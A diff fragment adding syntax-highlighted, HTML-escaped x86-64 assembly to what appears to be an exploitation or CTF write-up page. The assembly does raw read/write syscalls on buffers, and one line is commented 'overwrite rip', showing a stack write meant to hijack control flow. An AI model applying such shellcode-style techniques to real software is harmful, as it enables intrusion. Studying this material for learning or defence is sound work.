+        &lt;span class=&quot;no&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rax&lt;/span&gt;                                                                                                  
+        &lt;span class=&quot;no&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;edi&lt;/span&gt;                                                                                                  
+        &lt;span class=&quot;no&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;                                                                                              
+        &lt;span class=&quot;no&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0x602008&lt;/span&gt;                                                                                       
+        &lt;span class=&quot;no&quot;&gt;syscall&lt;/span&gt;                                                                                                       
+                                                                                                                      
+        &lt;span class=&quot;no&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;                                                                                              
+        &lt;span class=&quot;no&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;FD&lt;/span&gt;                                                                                                   
+        &lt;span class=&quot;no&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0x602008&lt;/span&gt;                                                                                       
+        &lt;span class=&quot;no&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;                                                                                              
+        &lt;span class=&quot;no&quot;&gt;syscall&lt;/span&gt;
+    
+    &lt;span class=&quot;nf&quot;&gt;sub&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0x600&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rsp&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0x500&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;syscall&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0x234&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;r9&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;--------&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;overwrite&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rip&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;                                                                                              
+        &lt;span class=&quot;no&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;FD&lt;/span&gt;                                                                                                   
+        &lt;span class=&quot;no&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rsp&lt;/span&gt;                                                                                            
+        &lt;span class=&quot;no&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0x500&lt;/span&gt;                                                                                          
+        &lt;span class=&quot;no&quot;&gt;syscall&lt;/span&gt;                                                                                                       
+        &lt;span class=&quot;no&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0x600&lt;/span&gt;                                                                                                
+                                                                                                                      
+        &lt;span class=&quot;no&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rax&lt;/span&gt;                                                                                                  
+        &lt;span class=&quot;no&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;edi&lt;/span&gt;                                                                                                  
+        &lt;span class=&quot;no&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0x6020b8&lt;/span&gt;                                                                                       
+        &lt;span class=&quot;no&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;119&lt;/span&gt;                                                                                                  
+        &lt;span class=&quot;no&quot;&gt;syscall&lt;/span&gt;                                                                                                       
+                                                                                                                      
+        &lt;span class=&quot;no&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;                                                                                              
+        &lt;span class=&quot;no&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;                                                                                                    
+        &lt;span class=&quot;no&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0x6020B8&lt;/span&gt;                                                                                       
+        &lt;span class=&quot;no&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;119&lt;/span&gt;                                                                                            
+        &lt;span class=&quot;no&quot;&gt;syscall&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;&lt;br&gt;&lt;/p&gt;
